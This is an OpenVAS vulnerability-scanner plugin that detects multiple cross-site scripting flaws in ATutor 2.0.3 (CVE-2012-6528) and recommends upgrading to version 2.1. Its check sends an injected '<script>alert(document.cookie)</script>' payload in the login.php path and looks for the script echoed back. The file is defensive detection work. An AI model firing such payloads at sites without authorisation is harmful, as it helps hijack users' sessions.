###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_atutor_mult_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Atutor Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected
  site.
  Impact Level: Application";
tag_affected = "ATutor version 2.0.3";
tag_insight = "Multiple flaws are due to an input passed to the various pages are not
  properly sanitised before being returned to the user.";
tag_solution = "Update to ATutor Version 2.1
  For updates refer to http://atutor.ca/atutor/change_log.php";
tag_summary = "This host is running Atutor and is prone to multiple cross site
  scripting vulnerabilities.";

if(description)
{
  script_id(802561);
  script_version("$Revision: 12 $");
  script_bugtraq_id(51423);
  script_cve_id("CVE-2012-6528");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-01-17 12:09:44 +0530 (Tue, 17 Jan 2012)");
  script_name("Atutor Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51423/info");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521260");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108706/SSCHADV2012-002.txt");

  script_description(desc);
  script_summary("Check if Atutor is vulnerable to Cross Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

## Get host
host = get_host_name();
if(!host){
  exit(0);
}

## Check for each possible path
foreach dir (make_list("/ATutor", "/atutor", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item:string(dir,"/login.php"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if("ATutor<" >< res)
  {
    ## Construct the attack
    if(http_vuln_check(port:port, url:dir + "/login.php/index.php<script>alert" +
                      "(document.cookie)</script>/index.php",
                      pattern:"<script>alert\(document.cookie\)</script>"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
